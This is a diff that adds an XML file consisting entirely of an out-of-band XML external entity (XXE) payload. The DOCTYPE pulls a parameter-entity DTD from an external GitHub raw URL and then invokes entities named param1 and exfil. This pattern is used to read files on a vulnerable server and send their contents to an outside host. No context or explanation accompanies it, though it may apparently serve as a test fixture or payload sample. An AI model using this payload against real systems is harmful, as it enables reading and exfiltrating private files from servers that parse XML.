@@ -1,0 +1,8 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/SVadim94/Templates/master/dtd.xml">
+%sp;
+%param1;
+%exfil;
+]>
